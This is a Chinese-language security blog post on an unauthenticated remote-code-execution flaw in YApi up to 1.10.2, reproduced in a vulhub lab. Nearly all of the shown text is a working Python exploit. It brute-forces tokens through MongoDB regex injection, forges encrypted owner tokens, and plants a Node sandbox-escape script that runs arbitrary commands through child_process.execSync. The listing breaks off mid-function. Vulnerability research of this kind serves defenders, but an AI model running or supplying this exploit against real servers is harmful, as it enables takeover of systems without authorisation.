<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>YApi 1.10.2 Unauthenticed RCE Via NoSQL Injection - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="YApi 1.10.2 Unauthenticed RCE Via NoSQL Injection - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2024/03/10/YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2024-03-10T04:59:52.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>10,</span>
            <span>2024</span>
        </div>
        

        <h2 class="title">YApi 1.10.2 Unauthenticed RCE Via NoSQL Injection</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Yapi &lt;&#x3D;1.10.2</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>使用vulhub搭建环境复现，exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;attacker&#x27;</span>)</span><br><span class="line">logger.setLevel(<span class="string">&#x27;WARNING&#x27;</span>)</span><br><span class="line">ch = logging.StreamHandler(sys.stdout)</span><br><span class="line">ch.setFormatter(logging.Formatter(<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>))</span><br><span class="line">logger.addHandler(ch)</span><br><span class="line">choices = <span class="string">&#x27;abcedf0123456789&#x27;</span></span><br><span class="line">script_template = <span class="string">r&#x27;&#x27;&#x27;const sandbox = this</span></span><br><span class="line"><span class="string">const ObjectConstructor = this.constructor</span></span><br><span class="line"><span class="string">const FunctionConstructor = ObjectConstructor.constructor</span></span><br><span class="line"><span class="string">const myfun = FunctionConstructor(&#x27;return process&#x27;)</span></span><br><span class="line"><span class="string">const process = myfun()</span></span><br><span class="line"><span class="string">const Buffer = FunctionConstructor(&#x27;return Buffer&#x27;)()</span></span><br><span class="line"><span class="string">const output = process.mainModule.require(&quot;child_process&quot;).execSync(Buffer.from(&#x27;%s&#x27;, &#x27;hex&#x27;).toString()).toString()</span></span><br><span class="line"><span class="string">context.responseData = &#x27;testtest&#x27; + output + &#x27;testtest&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute</span>(<span class="params">passphase: <span class="built_in">str</span></span>):</span><br><span class="line">    nkey = <span class="number">24</span></span><br><span class="line">    niv = <span class="number">16</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        h.update(binascii.unhexlify(p))</span><br><span class="line">        h.update(passphase.encode())</span><br><span class="line">        p = h.hexdigest()</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">min</span>(<span class="built_in">len</span>(p) - i, <span class="number">2</span> * nkey)</span><br><span class="line">        nkey -= n // <span class="number">2</span></span><br><span class="line">        key += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line">        n = <span class="built_in">min</span>(<span class="built_in">len</span>(p) - i, <span class="number">2</span> * niv)</span><br><span class="line">        niv -= n // <span class="number">2</span></span><br><span class="line">        iv += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nkey + niv == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> binascii.unhexlify(key), binascii.unhexlify(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data</span>):</span><br><span class="line">    key, iv = compute(<span class="string">&#x27;abcde&#x27;</span>)</span><br><span class="line">    padder = padding.PKCS7(<span class="number">128</span>).padder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(ct).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decode</span>(<span class="params">data</span>):</span><br><span class="line">    key, iv = compute(<span class="string">&#x27;abcde&#x27;</span>)</span><br><span class="line">    unpadder = padding.PKCS7(<span class="number">128</span>).unpadder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    ct = decryptor.update(binascii.unhexlify(data)) + decryptor.finalize()</span><br><span class="line">    ct = unpadder.update(ct) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> ct.decode().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_token</span>(<span class="params">target, already</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/interface/up&#x27;</span>)</span><br><span class="line">    current = <span class="string">&#x27;^&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> choices:</span><br><span class="line">            guess = current + ch</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: -<span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;token&#x27;</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;$regex&#x27;</span>: guess,</span><br><span class="line">                    <span class="string">&#x27;$nin&#x27;</span>: already</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.post(url,</span><br><span class="line">                                     data=json.dumps(data),</span><br><span class="line">                                     headers=headers,</span><br><span class="line">                                     <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                                     <span class="comment"># verify=False,</span></span><br><span class="line">                                     )</span><br><span class="line">            res = response.json()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> res[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">400</span>:</span><br><span class="line">                current = guess</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        logger.debug(<span class="string">f&#x27;current cuess: <span class="subst">&#123;current&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> current[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_owner_uid</span>(<span class="params">target, token</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/get&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        params = &#123;<span class="string">&#x27;token&#x27;</span>: aes_encode(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)&#125;</span><br><span class="line">        response = requests.get(url, params=params,</span><br><span class="line">                            <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                            <span class="comment"># verify=False,</span></span><br><span class="line">                            )</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_project</span>(<span class="params">target, token, pid=<span class="literal">None</span></span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/get&#x27;</span>)</span><br><span class="line">    params = &#123;<span class="string">&#x27;token&#x27;</span>: token&#125;</span><br><span class="line">    <span class="keyword">if</span> pid:</span><br><span class="line">        params[<span class="string">&#x27;id&#x27;</span>] = pid</span><br><span class="line"></span><br><span class="line">    response = requests.get(url,</span><br><span class="line">                            params=params,</span><br><span class="line">                            <span class="comment">#proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                            <span class="comment">#verify=False,</span></span><br><span class="line">                            )</span><br><span class="line">    data = response.json()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_col</span>(<span class="params">target, token, brute_from, brute_to</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/open/run_auto_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(brute_from, brute_to):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            params = &#123;<span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;id&#x27;</span>: i, <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;json&quot;</span>&#125;</span><br><span class="line">            response = requests.get(url,</span><br><span class="line">                                    params=params,</span><br><span class="line">                                    timeout=<span class="number">5</span>,</span><br><span class="line">                                    <span class="comment">#proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                                    <span class="comment">#verify=False,</span></span><br><span class="line">                                    )</span><br><span class="line"></span><br><span class="line">            data = response.json()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;message&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">&#x27;message&#x27;</span>][<span class="string">&#x27;len&#x27;</span>] &gt; <span class="number">0</span>:</span><br><span class="line">                logger.debug(<span class="string">&#x27;Test Result Found: %r&#x27;</span>, response.url)</span><br><span class="line">                <span class="keyword">yield</span> i</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            logger.debug(<span class="string">&#x27;id=%d timeout&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_project</span>(<span class="params">target, token, project_id, command</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/up&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    command_hex = command.encode().<span class="built_in">hex</span>()</span><br><span class="line">    script = script_template % command_hex</span><br><span class="line">    response = requests.post(url,</span><br><span class="line">                             params=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;,</span><br><span class="line">                             json=&#123;<span class="string">&#x27;id&#x27;</span>: project_id, <span class="string">&#x27;after_script&#x27;</span>: script&#125;,</span><br><span class="line">                             <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                             <span class="comment"># verify=False,</span></span><br><span class="line">                             )</span><br><span class="line">    data = response.json()</span><br><span class="line">    <span class="keyword">return</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_auto_test</span>(<span class="params">target, token, col_id</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/open/run_auto_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, </span><br><span class="line">                            params=&#123;<span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;id&#x27;</span>: col_id, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;json&#x27;</span>&#125;,</span><br><span class="line">                            <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                            <span class="comment"># verify=False,</span></span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">&#x27;list&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;res_body&#x27;</span>][<span class="number">8</span>:-<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">except</span> (requests.exceptions.JSONDecodeError, KeyError, IndexError, TypeError) <span class="keyword">as</span> e:</span><br><span class="line">        g = re.search(<span class="string">br&#x27;testtest(.*?)testtest&#x27;</span>, response.content, re.I | re.S)</span><br><span class="line">        <span class="keyword">if</span> g:</span><br><span class="line">            <span class="keyword">return</span> g.group(<span class="number">1</span>).decode()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_project</span>(<span class="params">target, token, project_id, old_after_script</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/up&#x27;</span>)</span><br><span class="line">    response = requests.post(url, params=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;, json=&#123;<span class="string">&#x27;id&#x27;</span>: project_id, <span class="string">&#x27;after_script&#x27;</span>: old_after_script&#125;)</span><br><span class="line">    data = response.json()</span><br><span class="line">    <span class="keyword">return</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@click.group()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--debug&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cli</span>(<span class="params">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        logger.setLevel(<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;enc&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.argument(<span class="params"><span class="string">&#x27;data&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_enc</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    click.echo(aes_encode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;dec&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.argument(<span class="params"><span class="string">&#x27;data&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_dec</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    click.echo(aes_decode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;token&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--count&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_token</span>(<span class="params">url, count</span>):</span><br><span class="line">    already = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        click.echo(<span class="string">f&#x27;find a valid token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        already.append(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;owner&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_owner</span>(<span class="params">url, token</span>):</span><br><span class="line">    aid = find_owner_uid(url, 